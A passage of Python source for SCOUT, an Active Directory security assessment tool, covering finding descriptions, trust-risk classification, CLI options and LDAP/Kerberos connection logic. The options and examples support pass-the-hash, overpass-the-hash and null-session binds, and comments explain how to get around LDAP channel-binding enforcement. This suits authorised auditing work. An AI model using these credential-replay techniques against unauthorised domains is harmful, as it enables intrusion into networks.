        "technical": "Computer object AZUREADSSOACC$ with pwdLastSet older than the rotation window.",
        "remediation": [
            "Rotate the Seamless SSO key (Update-AzureADSSOForest) on a schedule; consider disabling Seamless SSO if unused.",
        ],
        "refs": ["https://learn.microsoft.com/entra/identity/hybrid/connect/how-to-connect-sso-faq"],
    },
    "S-OrphanedGPO": {
        "description": "Group Policy Objects exist that are not linked to the domain, any OU, or any site.",
        "why": "Unlinked GPOs apply to nothing, but they retain their settings and DACLs. They are a cleanup item, and one a defender should review — an attacker with edit + link rights could weaponize an unlinked GPO, and orphaned policies hide drift.",
        "technical": "groupPolicyContainer objects whose DN appears in no gPLink across the domain root, OUs or sites.",
        "remediation": [
            "Review and delete GPOs that are intentionally unlinked; relink any that should be active.",
        ],
    },
}

# ─────────────────────────────────────────────────────────────────────────────
# Helper — deduplicate while preserving order
# ─────────────────────────────────────────────────────────────────────────────
def _dedup_keep_order(items):
    seen = set()
    out = []
    for x in items:
        k = x if isinstance(x, str) else str(x)
        if k in seen:
            continue
        seen.add(k)
        out.append(x)
    return out

# ─────────────────────────────────────────────────────────────────────────────
# HELPER UTILITIES
# ─────────────────────────────────────────────────────────────────────────────

def _krb_error_hint(ke) -> str:
    """Turn an impacket KerberosError into an operator-friendly diagnosis."""
    s = str(ke)
    low = s.lower()
    if "skew" in low or "clock" in low:
        return (f"{s}\n      -> Clock skew with the DC (>5 min). Sync time: "
                f"`sudo rdate -n <dc-ip>` or `sudo ntpdate <dc-ip>`.")
    if "principal_unknown" in low or "c_principal_unknown" in low:
        return (f"{s}\n      -> Username or realm is wrong. Check -u and that "
                f"-d is the AD DNS domain (e.g. corp.local).")
    if "preauth_failed" in low or "preauthentication" in low:
        return f"{s}\n      -> Bad password / NT hash / AES key."
    if "etype_nosupp" in low or "etype" in low:
        return (f"{s}\n      -> Encryption type unsupported. The account may be "
                f"AES-only; supply --aes-key instead of -p/-H.")
    if "client_revoked" in low or "revoked" in low:
        return f"{s}\n      -> Account is disabled or locked out."
    if "key_expired" in low or "expired" in low:
        return f"{s}\n      -> Password expired; reset it before assessing."
    if "wrong_realm" in low:
        return f"{s}\n      -> Wrong realm; -d must match the account's domain."
    return s


def filetime_to_dt(ft) -> Optional[datetime.datetime]:
    if ft is None:
        return None
    ft = int(ft)
    if ft in (FILETIME_NEVER, FILETIME_ZERO):
        return None
    try:
        ts = ft / 10_000_000 - 11_644_473_600
        return datetime.datetime.fromtimestamp(ts, tz=datetime.timezone.utc)
    except (ValueError, OSError):
        return None

def days_since(dt: Optional[datetime.datetime]) -> Optional[int]:
    if dt is None:
        return None
    return (datetime.datetime.now(tz=datetime.timezone.utc) - dt).days

def sid_to_str(raw) -> str:
    if raw is None:
        return ""
    if isinstance(raw, str):
        return raw
    try:
        if isinstance(raw, (bytes, bytearray)):
            b = raw
        else:
            b = bytes(raw)
        rev = b[0]
        sub_count = b[1]
        auth = int.from_bytes(b[2:8], 'big')
        subs = struct.unpack_from(f'<{sub_count}I', b, 8)
        return f"S-{rev}-{auth}-" + "-".join(str(s) for s in subs)
    except Exception:
        return str(raw)

def to_text(v) -> str:
    """Backend-agnostic value -> str. The impacket/Kerberos backend returns every
    attribute as raw bytes (see ADConnection._impacket_search), whereas ldap3
    hands back decoded strings. str(b'SubCA') yields the literal "b'SubCA'", which
    is how object names leaked into the report as b'...'. Decode bytes as UTF-8
    (AD's directory string encoding) so both backends render identically."""
    if isinstance(v, (bytes, bytearray)):
        try:
            return bytes(v).decode("utf-8")
        except UnicodeDecodeError:
            return bytes(v).decode("utf-8", "replace")
    return str(v)

def get_int(entry_attrs, attr: str, default=0) -> int:
    v = entry_attrs.get(attr)
    if v is None:
        return default
    if isinstance(v, list):
        v = v[0] if v else default
    try:
        return int(v)
    except (TypeError, ValueError):
        return default

def get_str(entry_attrs, attr: str, default="") -> str:
    v = entry_attrs.get(attr)
    if v is None:
        return default
    if isinstance(v, list):
        v = v[0] if v else default
    return to_text(v) if v is not None else default

def get_list(entry_attrs, attr: str) -> List[str]:
    v = entry_attrs.get(attr)
    if v is None:
        return []
    if isinstance(v, (list, tuple)):
        return [to_text(x) for x in v if x is not None]
    return [to_text(v)]

def dn_base(dn: str) -> str:
    """Return the first RDN value from a DN."""
    m = re.match(r'^[^=]+=([^,]+)', dn or "")
    return m.group(1) if m else dn

def classify_trust(attrs: Dict) -> Dict:
    """Classify a trustedDomain object's scope / transitivity / direction and the
    cross-domain risks it carries (roadmap item 9). Factual, derived purely from
    trustAttributes / trustDirection / trustType."""
    name = (get_str(attrs, "trustPartner") or get_str(attrs, "name")
            or get_str(attrs, "flatName"))
    ta = get_int(attrs, "trustAttributes")
    tdir = get_int(attrs, "trustDirection")
    ttype = get_int(attrs, "trustType")
    direction = {0: "Disabled", 1: "Inbound", 2: "Outbound",
                 3: "Bidirectional"}.get(tdir, f"?({tdir})")
    if ta & TRUST_ATTR_WITHIN_FOREST:
        scope = "Intra-forest"
    elif ta & TRUST_ATTR_FOREST:
        scope = "Forest"
    elif ttype == TRUST_TYPE_MIT:
        scope = "Realm (MIT)"
    elif ta & TRUST_ATTR_TREAT_EXTERNAL:
        scope = "External (treat-as-external)"
    else:
        scope = "External"
    # External (non-forest, non-intra-forest) trusts are non-transitive; otherwise
    # honor the explicit NON_TRANSITIVE bit.
    intra_or_forest = bool(ta & (TRUST_ATTR_WITHIN_FOREST | TRUST_ATTR_FOREST))
    transitive = (not (ta & TRUST_ATTR_NON_TRANSITIVE)) if intra_or_forest else False
    sid_filtering = bool(ta & TRUST_ATTR_QUARANTINED) or bool(ta & TRUST_ATTR_WITHIN_FOREST)
    selective_auth = bool(ta & TRUST_ATTR_CROSS_ORG)
    tgt_delegation = bool(ta & TRUST_ATTR_TGT_DELEGATION)
    risks = []
    # Inbound/Bidirectional = the partner's principals can authenticate INTO this
    # domain; without SID filtering that enables SID-history injection from the
    # partner to escalate here.
    exposes_us = tdir in (TRUST_DIR_INBOUND, TRUST_DIR_BIDIRECT)
    if exposes_us and not sid_filtering:
        risks.append("SID filtering off + inbound — SID-history injection from "
                     f"'{name}' can escalate into this domain")
    if tgt_delegation:
        risks.append("TGT delegation enabled — unconstrained host in the trusted "
                     "domain can capture this domain's TGTs")
    if scope.startswith("External") and transitive:
        risks.append("transitive external trust — widens the reachable surface")
    return {"name": name, "direction": direction, "scope": scope,
            "transitive": transitive, "sid_filtering": sid_filtering,
            "selective_auth": selective_auth, "tgt_delegation": tgt_delegation,
            "type": {1: "Downlevel (NT4)", 2: "Uplevel (AD)", 3: "MIT",
                     4: "DCE"}.get(ttype, str(ttype)),
            "risks": risks}

def check_port(host: str, port: int, timeout: float = 3.0) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def uac_has(uac_int: int, flag: int) -> bool:
    return bool(int(uac_int) & flag)

# ─────────────────────────────────────────────────────────────────────────────
# CLI ARGUMENT PARSER
# ─────────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="scout",
        description=f"{TOOL_NAME} v{VERSION} — {TOOL_LONG}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -d corp.local -u john -p 'P@ssw0rd' --dc-ip 10.0.0.1
  %(prog)s -d corp.local -u john -H :31d6cfe0d16ae931b73c59d7e0c089c0 --dc-ip 10.0.0.1
  %(prog)s -d corp.local -k --dc-ip 10.0.0.1
  %(prog)s -d corp.local --null-session --dc-ip 10.0.0.1
  %(prog)s -d corp.local -u john -p 'P@ssw0rd' --dc-ip 10.0.0.1 --ldaps
  %(prog)s -d corp.local -u john -p 'P@ssw0rd' --dc-ip 10.0.0.1 --output /tmp/report.html
  %(prog)s -d corp.local --ccache /tmp/krb5cc_1000 --dc-ip 10.0.0.1
        """)

    auth = p.add_argument_group("Authentication")
    auth.add_argument("-u", "--username",  metavar="USER",   help="Username")
    auth.add_argument("-p", "--password",  metavar="PASS",   help="Password")
    auth.add_argument("-H", "--hashes",    metavar="LM:NT",  help="NTLM hashes (use :NThash for PTH / overpass-the-hash)")
    auth.add_argument("-d", "--domain",    metavar="DOMAIN", required=True, help="Target domain (FQDN, e.g. corp.local)")
    auth.add_argument("-k", "--kerberos",  action="store_true",
                      help="Use Kerberos: request a TGT from the supplied "
                           "password / -H hash / --aes-key (or reuse a ccache). "
                           "Best path when LDAP signing or channel binding is enforced.")
    auth.add_argument("--ccache",          metavar="FILE",
                      help="Reuse an existing Kerberos ccache (implies -k). "
                           "Also honored via the KRB5CCNAME env var.")
    auth.add_argument("--save-ccache",     metavar="FILE", nargs="?", const="__AUTO__",
                      help="Save the obtained TGT to a ccache for reuse "
                           "(optional path; defaults to <user>.ccache).")
    auth.add_argument("--aes-key",         metavar="HEX",
                      help="AES 128/256 key for Kerberos (implies -k)")
    auth.add_argument("--no-pass",         action="store_true",
                      help="Do not prompt for password")
    auth.add_argument("--null-session",    action="store_true",
                      help="Attempt unauthenticated LDAP (anonymous bind)")
    auth.add_argument("--dc-ip",           metavar="IP",    required=True,
                      help="IP or hostname of domain controller (also used as the KDC)")
    auth.add_argument("--dc-host",         metavar="FQDN",
                      help="DC FQDN for the Kerberos SPN (auto-resolved if omitted)")

    conn = p.add_argument_group("Connection")
    conn.add_argument("--ldaps",     action="store_true", help="Use LDAPS (port 636)")
    conn.add_argument("--port",      type=int, default=0,
                      help="Override LDAP port (default 389 / 636 with --ldaps)")
    conn.add_argument("--gc",        action="store_true",
                      help="Use Global Catalog port (3268 or 3269)")
    conn.add_argument("--timeout",   type=int, default=20,
                      help="LDAP/network timeout in seconds (default 20)")
    conn.add_argument("--no-smb",    action="store_true",
                      help="Skip SMB-based checks (signature, SMBv1, null session)")
    conn.add_argument("--no-adcs",   action="store_true",
                      help="Skip ADCS certificate template checks")
    conn.add_argument("--no-paths",  action="store_true",
                      help="Skip control-path (Tier-0 reachability) analysis. It "
                           "bulk-reads security descriptors and runs a graph "
                           "closure — the slowest stage on large domains.")
    conn.add_argument("--accurate-logon", action="store_true",
                      help="For privileged-inactivity findings, reconcile the "
                           "(replicated, up-to-14-days-stale) lastLogonTimestamp "
                           "against the non-replicated lastLogon on EVERY DC and "
                           "use the most recent. Extra per-DC queries; clears "
                           "false 'inactive'/'never logged on' admin findings.")

    out = p.add_argument_group("Output")
    out.add_argument("-o", "--output", metavar="FILE",
                     help="HTML report output path (default: scout_<domain>_<ts>.html)")
    out.add_argument("--json",   metavar="FILE", nargs="?", const="__AUTO__",
                     help="Also write JSON findings (optional path; default scout_<domain>.json)")
    out.add_argument("--csv",    metavar="FILE", nargs="?", const="__AUTO__",
                     help="Also write a CSV of findings (optional path; default scout_<domain>.csv)")
    out.add_argument("--operator", metavar="NAME", default="",
                     help="Operator/author name printed on the report cover")
    out.add_argument("--scope",    metavar="TEXT", default="",
                     help="Engagement scope note printed on the report cover")
    out.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    out.add_argument("--no-color",      action="store_true", help="Disable color output")
    return p

def make_args(**overrides):
    """A fully-defaulted args namespace (every CLI flag at its argparse default),
    with overrides applied. Lets embedders — notably the NetExec module — drive
    the engine without reconstructing the whole flag set."""
    ns = build_parser().parse_args(["-d", overrides.get("domain", "example.local"),
                                    "--dc-ip", overrides.get("dc_ip", "127.0.0.1")])
    for k, v in overrides.items():
        setattr(ns, k, v)
    return ns

# ─────────────────────────────────────────────────────────────────────────────
# FINDING  (one rule trigger)
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Finding:
    rule_id:  str
    title:    str
    category: str
    points:   int
    severity: str
    details:  str = ""
    affected: List[str] = field(default_factory=list)
    maturity: int = 3                       # CMMI 1 (worst) .. 5 (best)
    mitre:    List[str] = field(default_factory=list)  # ["T1003.006: DCSync", …]

    @property
    def sev_color(self) -> str:
        return SEV_COLOR.get(self.severity, "#95a5a6")

# ─────────────────────────────────────────────────────────────────────────────
# AD CONNECTION
# ─────────────────────────────────────────────────────────────────────────────

class ADConnection:
    def __init__(self, args):
        self.args      = args
        self.conn      = None
        self.server    = None
        self.base_dn   = ""
        self.cfg_nc    = ""
        self.sch_nc    = ""
        self._impacket = None  # set when impacket backend is active
        self.gc_root = ""
        # functional levels — populated for BOTH backends so collection never
        # depends on ldap3's server.info (which is absent on the Kerberos path).
        self.domain_func = -1
        self.forest_func = -1

    def _ldap_port(self) -> int:
        if self.args.port:
            return self.args.port
        if self.args.gc:
            return 3269 if self.args.ldaps else 3268
        return 636 if self.args.ldaps else 389

    def _resolve_dc_hostname(self) -> str:
        """Return the DC's FQDN for Kerberos SPN construction.
        Order: explicit --dc-host, cached value, RootDSE dnsHostName,
        reverse DNS, then the IP as a last resort."""
        if getattr(self.args, "dc_host", None):
            return self.args.dc_host
        if getattr(self, "_dc_fqdn", None):
            return self._dc_fqdn
        # RootDSE is the most reliable: it returns the DC's real dnsHostName
        # even when reverse DNS / PTR records are absent.
        try:
            probe = Server(self.args.dc_ip, port=self._ldap_port() if not self.args.ldaps else 389,
                           use_ssl=False, get_info=DSA, connect_timeout=self.args.timeout)
            conn = Connection(probe)
            if conn.open() is not False and probe.info:
                dh = probe.info.other.get("dnsHostName")
                if dh:
                    self._dc_fqdn = dh[0] if isinstance(dh, list) else dh
                    try: conn.unbind()
                    except Exception: pass
                    return self._dc_fqdn
            try: conn.unbind()
            except Exception: pass
        except Exception:
            pass
        try:
            self._dc_fqdn = socket.gethostbyaddr(self.args.dc_ip)[0]
            return self._dc_fqdn
        except (socket.herror, socket.gaierror, OSError):
            pass
        return self.args.dc_ip

    def _build_server(self) -> Server:
        port = self._ldap_port()
        # version=None lets ldap3 use create_default_context() then explicitly
        # disables cert/hostname validation — avoids PROTOCOL_TLS_CLIENT's
        # strict defaults that cause connection resets against self-signed DCs.
        tls = ldap3.Tls(validate=ssl.CERT_NONE) if self.args.ldaps else None
        # get_info=DSA (RootDSE only), NOT ALL: loading the SCHEMA makes ldap3
        # validate every requested attribute against it and fail the whole search
        # with LDAPAttributeError if any is absent (e.g. the LAPS attributes on a
        # domain without LAPS → 0 computers collected). SCOUT never uses the
        # schema; it only needs RootDSE naming contexts + functional levels.
        return Server(self.args.dc_ip, port=port, use_ssl=self.args.ldaps,
                      tls=tls, get_info=DSA, connect_timeout=self.args.timeout)

    def connect(self) -> bool:
        """Establish an authenticated LDAP session, choosing the most robust
        transport for the DC's hardening posture.

        Strategy
        --------
        * Kerberos requested (-k / --ccache / --aes-key)  -> impacket Kerberos.
          SCOUT requests a TGT itself from the supplied password, NT hash
          (overpass-the-hash) or AES key, then binds with GSS-SPNEGO. This
          satisfies "LDAP server signing required" and, over plain 389,
          sidesteps LDAPS channel-binding (EPA) entirely.
        * Otherwise -> fast ldap3 NTLM/SIMPLE path. If the DC answers
          strongerAuthRequired (signing/channel-binding enforced) we transparently
          upgrade to Kerberos when usable credentials are available.
        """
        # Explicit Kerberos path -------------------------------------------------
        if self.args.kerberos or self.args.ccache or self.args.aes_key:
            return self._connect_kerberos()

        self.server = self._build_server()
        bind_err = None
        try:
            self._do_bind()
        except Exception as e:
            bind_err = e
        # ldap3 sometimes reports strongerAuthRequired as bound==False + result
        # code 8 WITHOUT raising — detect both shapes.
        if bind_err is None and self.conn is not None and not self.conn.bound:
            res = self.conn.result or {}
            if res.get("result") == 8 or "strongerauth" in str(res).lower():
                bind_err = RuntimeError(f"strongerAuthRequired: {res.get('description','')}")
        if bind_err is not None:
            e = bind_err
            msg = str(e).lower()
            stronger = ("strongerauth" in msg or "00002028" in msg
                        or "confidentiality" in msg or "integrity" in msg
                        or "data 80090346" in msg)
            if stronger:
                print("[*] DC enforces LDAP signing / channel binding for this bind.")
                if self.args.username and (self.args.password is not None
                                           or self.args.hashes):
                    print("[*] Upgrading to Kerberos (requesting a TGT) — the "
                          "sealed GSS bind satisfies signing and bypasses EPA.")
                    self.args.kerberos = True
                    return self._connect_kerberos()
                if not self.args.ldaps:
                    print("[*] Retrying over LDAPS (636)…")
                    self.args.ldaps = True
                    self.server = self._build_server()
                    try:
                        self._do_bind()
                    except Exception as e2:
                        print(f"[-] LDAPS bind failed: {e2}")
                        return False
                else:
                    print("[-] Cannot satisfy the DC's bind requirements. "
                          "Supply credentials and use -k for Kerberos.")
                    return False
            else:
                print(f"[-] Connection error: {e}")
                return False

        if not self.conn or not self.conn.bound:
            print(f"[-] LDAP bind failed: {self.conn.result if self.conn else ''}")
            return False

        self._extract_root_info()
        return True

    def _do_bind(self) -> None:
        # check_names=False is essential: with the schema loaded (get_info=ALL),
        # ldap3 otherwise validates every REQUESTED attribute against the schema
        # and raises LDAPAttributeError for the whole search if any is absent.
        # On a domain without LAPS, requesting ms-Mcs-AdmPwdExpirationTime made
        # the entire computer search fail -> 0 computers collected, silently.
        # Disabling the check makes ldap3 behave like raw LDAP / the impacket
        # backend: ask for anything, the server returns what exists.
        if self.args.null_session:
            self.conn = Connection(self.server, auto_bind=True, check_names=False)
        elif self.args.hashes:
            lm, nt = self._parse_hashes()
            user = f"{self.args.domain}\\{self.args.username}"
            self.conn = Connection(self.server, user=user, password=f"{lm}:{nt}",
                                   authentication=NTLM, auto_bind=True, check_names=False)
        elif self.args.username and self.args.password is not None:
            user = f"{self.args.domain}\\{self.args.username}"
            self.conn = Connection(self.server, user=user, password=self.args.password,
                                   authentication=NTLM, auto_bind=True, check_names=False)
        else:
            raise ValueError("No credentials supplied and --null-session not set.")

    # ── Kerberos / impacket backend ───────────────────────────────────────────
    # Used whenever Kerberos is requested or when the DC enforces LDAP signing /
    # channel binding. impacket binds with a GSS-SPNEGO Kerberos AP-REQ which the
    # DC accepts as a "signed" SASL bind; over plain 389 there is no TLS channel,
    # so LDAPS channel-binding (EPA, KB5021130) does not apply.

    def _obtain_tgt(self, dc_fqdn: str):
        """Request a Kerberos TGT from the supplied secret and return it as the
        in-memory dict impacket's kerberosLogin() consumes.

        Returns None when an existing ccache should be used instead (the bind
        will then load credentials from KRB5CCNAME).
        """
        if self.args.ccache:
            if not os.path.exists(self.args.ccache):
                raise FileNotFoundError(f"ccache file not found: {self.args.ccache}")
            os.environ["KRB5CCNAME"] = os.path.abspath(self.args.ccache)
            print(f"[*] Using existing ccache: {self.args.ccache}")
            return None
        # No secret to forge a TGT with -> fall back to KRB5CCNAME (if any).
        have_secret = (self.args.password is not None or self.args.hashes
                       or self.args.aes_key)
        if not have_secret:
            if os.environ.get("KRB5CCNAME"):
                print(f"[*] Using ccache from KRB5CCNAME: {os.environ['KRB5CCNAME']}")
                return None
            raise ValueError("Kerberos requested but no password/-H/--aes-key "
                             "and no ccache (set --ccache or KRB5CCNAME).")

        from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants as _kconst
        from impacket.krb5.ccache import CCache

        if not self.args.username:
            raise ValueError("Kerberos auth requires a username (-u).")

        lm = nt = ""
        if self.args.hashes:
            lm, nt = self._parse_hashes()
        realm = self.args.domain.upper()
        principal = Principal(self.args.username,
                              type=_kconst.PrincipalNameType.NT_PRINCIPAL.value)
        how = ("AES key" if self.args.aes_key
               else ("NT hash (overpass-the-hash)" if self.args.hashes else "password"))
        print(f"[*] Requesting TGT for {self.args.username}@{realm} via {how} "
              f"(KDC {self.args.dc_ip})…")
        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                principal, self.args.password or "", realm,
                unhexlify(lm) if lm else b"", unhexlify(nt) if nt else b"",
                self.args.aes_key or "", self.args.dc_ip)
        except KerberosError as ke:
            raise RuntimeError(_krb_error_hint(ke))
        print("[+] TGT acquired.")

        # Persist the TGT to a ccache and export KRB5CCNAME so the later SMB /
        # SYSVOL Kerberos logins transparently reuse this ticket. If the operator
        # asked to keep it (--save-ccache) we honor their path; otherwise a temp
        # file is used and cleaned up at exit.
        cc = CCache()
        cc.fromTGT(tgt, oldSessionKey, sessionKey)
        if self.args.save_ccache:
            path = (self.args.save_ccache if self.args.save_ccache != "__AUTO__"
                    else f"{self.args.username}.ccache")
            cc.saveFile(path)
            print(f"[+] Saved ccache: {path}  (export KRB5CCNAME={os.path.abspath(path)})")
        else:
            fd, path = tempfile.mkstemp(suffix=".ccache", prefix="scout_")
            os.close(fd)
            cc.saveFile(path)
            import atexit
            atexit.register(lambda p=path: os.path.exists(p) and os.remove(p))
        os.environ["KRB5CCNAME"] = os.path.abspath(path)

        return {"KDC_REP": tgt, "cipher": cipher, "sessionKey": sessionKey}

    def _connect_kerberos(self) -> bool:
        try:
            from impacket.ldap import ldap as ildap
            from impacket.ldap.ldapasn1 import Scope as LDAPScope
        except ImportError:
            print("[-] impacket not available: pip install impacket")
            return False

        dc_fqdn = self._resolve_dc_hostname()
        if dc_fqdn == self.args.dc_ip:
            print("[!] Could not resolve the DC FQDN — Kerberos needs the SPN "
                  "ldap/<fqdn>. Pass --dc-host <fqdn> if the bind fails.")
        try:
            tgt = self._obtain_tgt(dc_fqdn)
        except Exception as e:
            print(f"[-] Kerberos pre-auth failed: {e}")
            return False

        lm = nt = ""
        if self.args.hashes:
            lm, nt = self._parse_hashes()
        scheme = "ldaps" if self.args.ldaps else "ldap"
        url = f"{scheme}://{dc_fqdn}"
        try:
            ic = ildap.LDAPConnection(url, "", self.args.dc_ip)
        except Exception as e:
            print(f"[-] impacket connect failed ({url}): {e}")
            return False

        try:
            ic.kerberosLogin(self.args.username or "", "", self.args.domain,
                             lmhash=lm, nthash=nt, aesKey=self.args.aes_key or "",
                             kdcHost=self.args.dc_ip, TGT=tgt,
                             useCache=(tgt is None))
        except Exception as e:
            print(f"[-] Kerberos LDAP bind failed: {e}")
            if self.args.ldaps:
                print("[!] LDAPS + Kerberos can fail under channel-binding "
                      "enforcement and impacket's TLS1.0 stack. Retry WITHOUT "
                      "--ldaps (Kerberos over 389 bypasses EPA).")
            return False
        print(f"[+] Kerberos LDAP bind successful ({url}).")

        self._impacket = ic
        # Remember the FQDN so the SMB/SYSVOL Kerberos logins build a valid SPN
        # (cifs/<fqdn>, not cifs/<ip> which yields KDC_ERR_S_PRINCIPAL_UNKNOWN).
        if not self.args.dc_host and dc_fqdn and dc_fqdn != self.args.dc_ip:
            self.args.dc_host = dc_fqdn
        # pull naming contexts AND functional levels from RootDSE (no ldap3
        # server.info on this path, so collection reads these from here).
        self._load_rootdse_impacket()
        return True

    def _load_rootdse_impacket(self):
        """Populate naming contexts + functional levels from RootDSE over the
        impacket backend. Shared by the Kerberos path and adopt_impacket()."""
        try:
            from impacket.ldap.ldapasn1 import Scope as LDAPScope
            resp = self._impacket.search(
                searchBase="", searchFilter="(objectClass=*)",
                scope=LDAPScope("baseObject"),
                attributes=["defaultNamingContext", "configurationNamingContext",
                            "schemaNamingContext", "rootDomainNamingContext",
                            "domainFunctionality", "forestFunctionality"])
            for entry in resp:
                # impacket can return SearchResultReference/Done entries with no
                # 'attributes' — guard per-entry so they don't abort the loop.
                try:
                    attrs_ = entry["attributes"]
                except Exception:
                    continue
                for attr in attrs_:
                    n = str(attr["type"]); v = str(attr["vals"][0]) if attr["vals"] else ""
                    if   n == "defaultNamingContext":       self.base_dn = v
                    elif n == "configurationNamingContext": self.cfg_nc  = v
                    elif n == "schemaNamingContext":        self.sch_nc  = v
                    elif n == "rootDomainNamingContext":    self.gc_root = v
                    elif n == "domainFunctionality":
                        try: self.domain_func = int(v)
                        except ValueError: pass
                    elif n == "forestFunctionality":
                        try: self.forest_func = int(v)
                        except ValueError: pass
        except Exception as e:
            if getattr(self.args, "verbose", False):
                print(f"[!] RootDSE read failed: {e}")
        if not self.base_dn:
            self.base_dn = ",".join(f"DC={p}" for p in self.args.domain.split("."))
        if not self.cfg_nc:
            self.cfg_nc = f"CN=Configuration,{self.base_dn}"
        if not self.sch_nc:
            self.sch_nc = f"CN=Schema,{self.cfg_nc}"

    def adopt_impacket(self, ldap_connection) -> bool:
        """Reuse an already-authenticated impacket LDAPConnection (e.g. NetExec's
        connection.ldap_connection) instead of binding ourselves — this is what
        lets the engine run as an `nxc ldap -M scout` module (roadmap item 8).
        All of SCOUT's impacket-backend search code keys off self._impacket."""
        self._impacket = ldap_connection
        self._load_rootdse_impacket()
        return True

    def _impacket_search(self, base: str, flt: str, attrs: List[str],
                         page_size: int = 500) -> List[Dict]:
        from impacket.ldap.ldapasn1 import SimplePagedResultsControl
        from impacket.ldap.ldap import LDAPSearchError
        ctrl = SimplePagedResultsControl(size=page_size)
        try:
            raw = self._impacket.search(searchBase=base, searchFilter=flt,
                                        attributes=attrs, searchControls=[ctrl])
        except LDAPSearchError as e:
            raw = e.getAnswers()
        except Exception as e:
            if self.args.verbose:
                print(f"[!] impacket search error: {e}")
            return []
        out = []
        for entry in raw:
            try:
                dn = str(entry["objectName"])
                ad = {}
                for a in entry["attributes"]:
                    ad[str(a["type"])] = [bytes(v) for v in a["vals"]]
                out.append({"dn": dn, "attrs": ad})
            except Exception:
                continue
        return out

    def _parse_hashes(self) -> Tuple[str, str]:
        h = self.args.hashes
        if ":" in h:
            lm, nt = h.split(":", 1)
        else:
            lm, nt = "aad3b435b51404eeaad3b435b51404ee", h
        if not lm or lm == "":
            lm = "aad3b435b51404eeaad3b435b51404ee"
        # Pad to 32 hex chars if needed
        lm = lm.ljust(32, "0")[:32]
        nt = nt.ljust(32, "0")[:32]
        return lm, nt

    def _extract_root_info(self):
        info = self.server.info if self.server else None
        if info:
            dns = info.other.get("defaultNamingContext", [""])
            self.base_dn = dns[0] if isinstance(dns, list) else dns
            cfg = info.other.get("configurationNamingContext", [""])
            self.cfg_nc  = cfg[0] if isinstance(cfg, list) else cfg
            sch = info.other.get("schemaNamingContext", [""])
            self.sch_nc  = sch[0] if isinstance(sch, list) else sch
            gc  = info.other.get("rootDomainNamingContext", [""])
            self.gc_root = gc[0] if isinstance(gc, list) else gc
            def _lvl(key):
                v = info.other.get(key, [None])
                v = v[0] if isinstance(v, list) else v
                try:    return int(v)
                except (TypeError, ValueError): return -1
            self.domain_func = _lvl("domainFunctionality")
            self.forest_func = _lvl("forestFunctionality")

    def paged_search(self, base: str, flt: str, attrs: List[str],
                     scope=ldap3.SUBTREE, page_size: int = 500) -> List[Dict]:
        if getattr(self, "_impacket", None):
            return self._impacket_search(base, flt, attrs, page_size)
        results = []
        try:
            gen = self.conn.extend.standard.paged_search(
                search_base=base,
                search_filter=flt,
                search_scope=scope,
                attributes=attrs,
                paged_size=page_size,
                generator=True)
            for entry in gen:
                if entry.get("type") == "searchResEntry":
                    # Use raw_attributes (always bytes), NOT attributes: with
                    # get_info=DSA there is no schema, so ldap3 leaves objectSid /
                    # other binary values as an undecoded str-of-bytes that
                    # sid_to_str can't parse. raw_attributes gives bytes, matching
                    # the impacket backend exactly — both paths now flow through
                    # to_text()/sid_to_str()/get_int() uniformly.
                    results.append({"dn": entry["dn"],
                                    "attrs": entry["raw_attributes"]})
        except LDAPException as e:
            if self.args.verbose:
                print(f"[!] LDAP search error ({base}, {flt}): {e}")
        return results

    def search_one(self, base: str, flt: str, attrs: List[str]) -> Optional[Dict]:
        r = self.paged_search(base, flt, attrs, page_size=5)
        return r[0] if r else None

    def fetch_sd(self, dn: str, sdflags: int = 0x07) -> Optional[bytes]:
        """Backend-agnostic single-object nTSecurityDescriptor read, with the
        LDAP_SERVER_SD_FLAGS control so the DACL is returned. Returns raw SD
        bytes or None. Centralizing this means checks no longer reach into the
        ldap3-only `self.conn` API directly (which silently did nothing on the
        Kerberos/impacket backend — e.g. the DNS-zone and OU ACL checks)."""
        if getattr(self, "_impacket", None):
            try:
                from impacket.ldap.ldapasn1 import Control, Scope as LDAPScope
                from pyasn1.codec.ber import encoder
                from pyasn1.type import univ
                ctrl = Control(); ctrl["controlType"] = "1.2.840.113556.1.4.801"
                seq = univ.Sequence(); seq.setComponentByPosition(0, univ.Integer(sdflags))
                ctrl["controlValue"] = encoder.encode(seq)
                res = self._impacket.search(
                    searchBase=dn, searchFilter="(objectClass=*)",
                    scope=LDAPScope("baseObject"), attributes=["nTSecurityDescriptor"],
                    searchControls=[ctrl])
                for entry in res:
                    try:
                        for attr in entry["attributes"]:
                            if str(attr["type"]) == "nTSecurityDescriptor" and attr["vals"]:
                                return bytes(attr["vals"][0])
                    except Exception:
                        continue
            except Exception as e:
                if self.args.verbose:
                    print(f"[!] fetch_sd (impacket) failed for {dn}: {e}")
            return None
        try:
            from ldap3.protocol.microsoft import security_descriptor_control as sdc
            # NOTE: security_descriptor_control() returns a list already; pass it
            # directly (controls=...), never wrapped in [ ].
            self.conn.search(dn, "(objectClass=*)", ldap3.BASE,
                             attributes=["nTSecurityDescriptor"],
                             controls=sdc(sdflags=sdflags))
            for entry in self.conn.response:
                if entry.get("type") == "searchResEntry":
                    raw = entry.get("raw_attributes", {}).get("nTSecurityDescriptor", [])
                    if raw:
                        return raw[0] if isinstance(raw, list) else raw
        except Exception as e:
            if self.args.verbose:
                print(f"[!] fetch_sd (ldap3) failed for {dn}: {e}")
        return None

# ─────────────────────────────────────────────────────────────────────────────
# AD DATA COLLECTOR
# ─────────────────────────────────────────────────────────────────────────────

class ADData:
    """Single collection pass — all LDAP data needed by checks."""

    def __init__(self, conn: ADConnection, args):
        self.conn  = conn
        self.args  = args
        self.base  = conn.base_dn
        self.cfg   = conn.cfg_nc
        self.sch   = conn.sch_nc

        # populated by collect()
        self.domain_obj:    Optional[Dict] = None
        self.users:         List[Dict] = []
        self.computers:     List[Dict] = []
        self.groups:        Dict[str, Dict] = {}   # sAMAccountName lower -> attrs
        self.dcs:           List[Dict] = []
        self.rodcs:         List[Dict] = []
        self.trusts:        List[Dict] = []
        self.trust_map:     List[Dict] = []   # classified trusts (scope/transitivity/risks)
